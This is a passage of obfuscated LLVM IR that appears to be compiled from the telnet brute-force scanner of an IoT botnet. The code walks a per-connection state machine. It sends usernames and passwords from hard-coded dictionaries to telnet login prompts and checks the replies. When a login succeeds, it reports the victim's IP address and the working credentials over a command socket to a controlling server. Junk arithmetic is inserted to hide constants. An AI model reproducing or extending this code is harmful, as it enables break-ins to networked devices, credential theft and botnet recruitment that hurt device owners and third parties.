  %301 = xor i64 -4712907165482481326, -1
  %302 = and i64 %299, -4712907165482481326
  %303 = and i64 %298, %301
  %304 = and i64 %300, -4712907165482481326
  %305 = and i64 %288, %301
  %306 = or i64 %302, %303
  %307 = or i64 %304, %305
  %308 = xor i64 %306, %307
  %309 = or i64 %299, %300
  %310 = xor i64 %309, -1
  %311 = or i64 -4712907165482481326, %301
  %312 = and i64 %310, %311
  %313 = or i64 %308, %312
  %314 = or i64 %298, %288
  store i64 %313, i64* %297, align 8
  %315 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %315, align 8
  %316 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %316, align 8
  %317 = load i32, i32* %2, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 0
  %321 = load i32, i32* %320, align 16
  %322 = sub i32 0, %321
  %323 = sub i32 0, 1
  %324 = add i32 %322, %323
  %325 = sub i32 0, %324
  %326 = add nsw i32 %321, 1
  %327 = call i32 @select(i32 %325, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %327, i32* %3, align 4
  %328 = load i32, i32* %3, align 4
  %329 = icmp eq i32 %328, 1
  br i1 %329, label %330, label %390

; <label>:330:                                    ; preds = %280
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = bitcast i32* %7 to i8*
  %337 = call i32 @getsockopt(i32 %335, i32 1, i32 4, i8* %336, i32* %6) #2
  %338 = load i32, i32* %7, align 4
  %339 = icmp ne i32 %338, 0
  br i1 %339, label %340, label %355

; <label>:340:                                    ; preds = %330
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 0
  %345 = load i32, i32* %344, align 16
  %346 = call i32 @sclose(i32 %345)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 2
  store i8 0, i8* %350, align 8
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 3
  store i8 1, i8* %354, align 1
  br label %389

; <label>:355:                                    ; preds = %330
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = load i32, i32* %2, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 0
  %365 = load i32, i32* %364, align 16
  %366 = call i32 (i32, i32, ...) @fcntl(i32 %365, i32 3, i8* null)
  %367 = xor i32 -2049, -1
  %368 = xor i32 %366, %367
  %369 = and i32 %368, %366
  %370 = and i32 %366, -2049
  %371 = call i32 (i32, i32, ...) @fcntl(i32 %360, i32 4, i32 %369)
  %372 = load i32, i32* %2, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 6
  store i32 0, i32* %375, align 4
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 7
  store i16 0, i16* %379, align 16
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 8
  %384 = load i8*, i8** %383, align 8
  call void @llvm.memset.p0i8.i64(i8* %384, i8 0, i64 1024, i32 1, i1 false)
  %385 = load i32, i32* %2, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 2
  store i8 2, i8* %388, align 8
  br label %1128

; <label>:389:                                    ; preds = %340
  br label %409

; <label>:390:                                    ; preds = %280
  %391 = load i32, i32* %3, align 4
  %392 = icmp eq i32 %391, -1
  br i1 %392, label %393, label %408

; <label>:393:                                    ; preds = %390
  %394 = load i32, i32* %2, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %395
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %396, i32 0, i32 0
  %398 = load i32, i32* %397, align 16
  %399 = call i32 @sclose(i32 %398)
  %400 = load i32, i32* %2, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 2
  store i8 0, i8* %403, align 8
  %404 = load i32, i32* %2, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 3
  store i8 1, i8* %407, align 1
  br label %408

; <label>:408:                                    ; preds = %393, %390
  br label %409

; <label>:409:                                    ; preds = %408, %389
  %410 = load i32, i32* %2, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %411
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %412, i32 0, i32 6
  %414 = load i32, i32* %413, align 4
  %415 = add i32 %414, 1449125244
  %416 = add i32 %415, 5
  %417 = sub i32 %416, 1449125244
  %418 = add i32 %414, 5
  %419 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %420 = icmp ult i32 %417, %419
  br i1 %420, label %421, label %436

; <label>:421:                                    ; preds = %409
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 16
  %427 = call i32 @sclose(i32 %426)
  %428 = load i32, i32* %2, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 2
  store i8 0, i8* %431, align 8
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 3
  store i8 1, i8* %435, align 1
  br label %436

; <label>:436:                                    ; preds = %421, %409
  br label %1127

; <label>:437:                                    ; preds = %70
  %438 = load i32, i32* %2, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 6
  %442 = load i32, i32* %441, align 4
  %443 = icmp eq i32 %442, 0
  br i1 %443, label %444, label %450

; <label>:444:                                    ; preds = %437
  %445 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %446 = load i32, i32* %2, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 6
  store i32 %445, i32* %449, align 4
  br label %450

; <label>:450:                                    ; preds = %444, %437
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 8
  %455 = load i8*, i8** %454, align 8
  %456 = call i32 @matchPrompt(i8* %455)
  %457 = icmp ne i32 %456, 0
  br i1 %457, label %458, label %463

; <label>:458:                                    ; preds = %450
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 2
  store i8 7, i8* %462, align 8
  br label %463

; <label>:463:                                    ; preds = %458, %450
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 16
  %469 = load i32, i32* %2, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 8
  %473 = load i8*, i8** %472, align 8
  %474 = load i32, i32* %2, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 7
  %478 = load i16, i16* %477, align 16
  %479 = zext i16 %478 to i32
  %480 = call i32 @readUntil(i32 %468, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %473, i32 1024, i32 %479)
  %481 = icmp ne i32 %480, 0
  br i1 %481, label %482, label %500

; <label>:482:                                    ; preds = %463
  %483 = load i32, i32* %2, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 6
  store i32 0, i32* %486, align 4
  %487 = load i32, i32* %2, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 7
  store i16 0, i16* %490, align 16
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 8
  %495 = load i8*, i8** %494, align 8
  call void @llvm.memset.p0i8.i64(i8* %495, i8 0, i64 1024, i32 1, i1 false)
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 2
  store i8 3, i8* %499, align 8
  br label %1128

; <label>:500:                                    ; preds = %463
  %501 = load i32, i32* %2, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 8
  %505 = load i8*, i8** %504, align 8
  %506 = call i64 @strlen(i8* %505) #10
  %507 = trunc i64 %506 to i16
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 7
  store i16 %507, i16* %511, align 16
  br label %512

; <label>:512:                                    ; preds = %500
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 6
  %517 = load i32, i32* %516, align 4
  %518 = sub i32 %517, 286903228
  %519 = add i32 %518, 30
  %520 = add i32 %519, 286903228
  %521 = add i32 %517, 30
  %522 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %523 = icmp ult i32 %520, %522
  br i1 %523, label %524, label %539

; <label>:524:                                    ; preds = %512
  %525 = load i32, i32* %2, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 0
  %529 = load i32, i32* %528, align 16
  %530 = call i32 @sclose(i32 %529)
  %531 = load i32, i32* %2, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 2
  store i8 0, i8* %534, align 8
  %535 = load i32, i32* %2, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 3
  store i8 1, i8* %538, align 1
  br label %539

; <label>:539:                                    ; preds = %524, %512
  br label %1127

; <label>:540:                                    ; preds = %70
  %541 = load i32, i32* %2, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %543, i32 0, i32 0
  %545 = load i32, i32* %544, align 16
  %546 = load i32, i32* %2, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 4
  %550 = load i8, i8* %549, align 2
  %551 = zext i8 %550 to i64
  %552 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %551
  %553 = load i8*, i8** %552, align 8
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 4
  %558 = load i8, i8* %557, align 2
  %559 = zext i8 %558 to i64
  %560 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %559
  %561 = load i8*, i8** %560, align 8
  %562 = call i64 @strlen(i8* %561) #10
  %563 = call i64 @send(i32 %545, i8* %553, i64 %562, i32 16384)
  %564 = icmp slt i64 %563, 0
  br i1 %564, label %565, label %580

; <label>:565:                                    ; preds = %540
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 0
  %570 = load i32, i32* %569, align 16
  %571 = call i32 @sclose(i32 %570)
  %572 = load i32, i32* %2, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 2
  store i8 0, i8* %575, align 8
  %576 = load i32, i32* %2, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 3
  store i8 1, i8* %579, align 1
  br label %1128

; <label>:580:                                    ; preds = %540
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 0
  %585 = load i32, i32* %584, align 16
  %586 = call i64 @send(i32 %585, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %587 = icmp slt i64 %586, 0
  br i1 %587, label %588, label %603

; <label>:588:                                    ; preds = %580
  %589 = load i32, i32* %2, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %590
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %591, i32 0, i32 0
  %593 = load i32, i32* %592, align 16
  %594 = call i32 @sclose(i32 %593)
  %595 = load i32, i32* %2, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 2
  store i8 0, i8* %598, align 8
  %599 = load i32, i32* %2, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 3
  store i8 1, i8* %602, align 1
  br label %1128

; <label>:603:                                    ; preds = %580
  %604 = load i32, i32* %2, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 2
  store i8 4, i8* %607, align 8
  br label %1127

; <label>:608:                                    ; preds = %70
  %609 = load i32, i32* %2, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 6
  %613 = load i32, i32* %612, align 4
  %614 = icmp eq i32 %613, 0
  br i1 %614, label %615, label %621

; <label>:615:                                    ; preds = %608
  %616 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %617 = load i32, i32* %2, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 6
  store i32 %616, i32* %620, align 4
  br label %621

; <label>:621:                                    ; preds = %615, %608
  %622 = load i32, i32* %2, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 0
  %626 = load i32, i32* %625, align 16
  %627 = load i32, i32* %2, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 8
  %631 = load i8*, i8** %630, align 8
  %632 = load i32, i32* %2, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 7
  %636 = load i16, i16* %635, align 16
  %637 = zext i16 %636 to i32
  %638 = call i32 @readUntil(i32 %626, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %631, i32 1024, i32 %637)
  %639 = icmp ne i32 %638, 0
  br i1 %639, label %640, label %698

; <label>:640:                                    ; preds = %621
  %641 = load i32, i32* @mainCommSock, align 4
  %642 = load i32, i32* %2, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 1
  %646 = bitcast i32* %645 to %struct.in_addr*
  %647 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %646, i32 0, i32 0
  %648 = load i32, i32* %647, align 4
  %649 = call i8* @inet_ntoa(i32 %648) #2
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 4
  %654 = load i8, i8* %653, align 2
  %655 = zext i8 %654 to i64
  %656 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %655
  %657 = load i8*, i8** %656, align 8
  %658 = load i32, i32* %2, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 5
  %662 = load i8, i8* %661, align 1
  %663 = zext i8 %662 to i64
  %664 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %663
  %665 = load i8*, i8** %664, align 8
  %666 = call i32 (i32, i8*, ...) @sockprintf(i32 %641, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.77, i32 0, i32 0), i8* %649, i8* %657, i8* %665)
  %667 = load i32, i32* %2, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 6
  store i32 0, i32* %670, align 4
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 7
  store i16 0, i16* %674, align 16
  %675 = load i32, i32* %2, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 8
  %679 = load i8*, i8** %678, align 8
  %680 = call i8* @strstr(i8* %679, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0)) #10
  %681 = icmp ne i8* %680, null
  br i1 %681, label %682, label %687

; <label>:682:                                    ; preds = %640
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 2
  store i8 5, i8* %686, align 8
  br label %692

; <label>:687:                                    ; preds = %640
  %688 = load i32, i32* %2, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 2
  store i8 7, i8* %691, align 8
  br label %692

; <label>:692:                                    ; preds = %687, %682
  %693 = load i32, i32* %2, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 8
  %697 = load i8*, i8** %696, align 8
  call void @llvm.memset.p0i8.i64(i8* %697, i8 0, i64 1024, i32 1, i1 false)
  br label %1128

; <label>:698:                                    ; preds = %621
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 8
  %703 = load i8*, i8** %702, align 8
  %704 = call i8* @strstr(i8* %703, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #10
  %705 = icmp ne i8* %704, null
  br i1 %705, label %706, label %721

; <label>:706:                                    ; preds = %698
  %707 = load i32, i32* %2, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 0
  %711 = load i32, i32* %710, align 16
  %712 = call i32 @sclose(i32 %711)
  %713 = load i32, i32* %2, align 4
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %714
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %715, i32 0, i32 2
  store i8 0, i8* %716, align 8
  %717 = load i32, i32* %2, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 3
  store i8 0, i8* %720, align 1
  br label %1128

; <label>:721:                                    ; preds = %698
  %722 = load i32, i32* %2, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 8
  %726 = load i8*, i8** %725, align 8
  %727 = call i64 @strlen(i8* %726) #10
  %728 = trunc i64 %727 to i16
  %729 = load i32, i32* %2, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 7
  store i16 %728, i16* %732, align 16
  br label %733

; <label>:733:                                    ; preds = %721
  %734 = load i32, i32* %2, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 6
  %738 = load i32, i32* %737, align 4
  %739 = add i32 %738, -1726255547
  %740 = add i32 %739, 8
  %741 = sub i32 %740, -1726255547
  %742 = add i32 %738, 8
  %743 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %744 = icmp ult i32 %741, %743
  br i1 %744, label %745, label %760

; <label>:745:                                    ; preds = %733
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 16
  %751 = call i32 @sclose(i32 %750)
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 2
  store i8 0, i8* %755, align 8
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 3
  store i8 1, i8* %759, align 1
  br label %760

; <label>:760:                                    ; preds = %745, %733
  br label %1127

; <label>:761:                                    ; preds = %70
  %762 = load i32, i32* %2, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 0
  %766 = load i32, i32* %765, align 16
  %767 = load i32, i32* %2, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 5
  %771 = load i8, i8* %770, align 1
  %772 = zext i8 %771 to i64
  %773 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %772
  %774 = load i8*, i8** %773, align 8
  %775 = load i32, i32* %2, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 5
  %779 = load i8, i8* %778, align 1
  %780 = zext i8 %779 to i64
  %781 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %780
  %782 = load i8*, i8** %781, align 8
  %783 = call i64 @strlen(i8* %782) #10
  %784 = call i64 @send(i32 %766, i8* %774, i64 %783, i32 16384)
  %785 = icmp slt i64 %784, 0
  br i1 %785, label %786, label %801

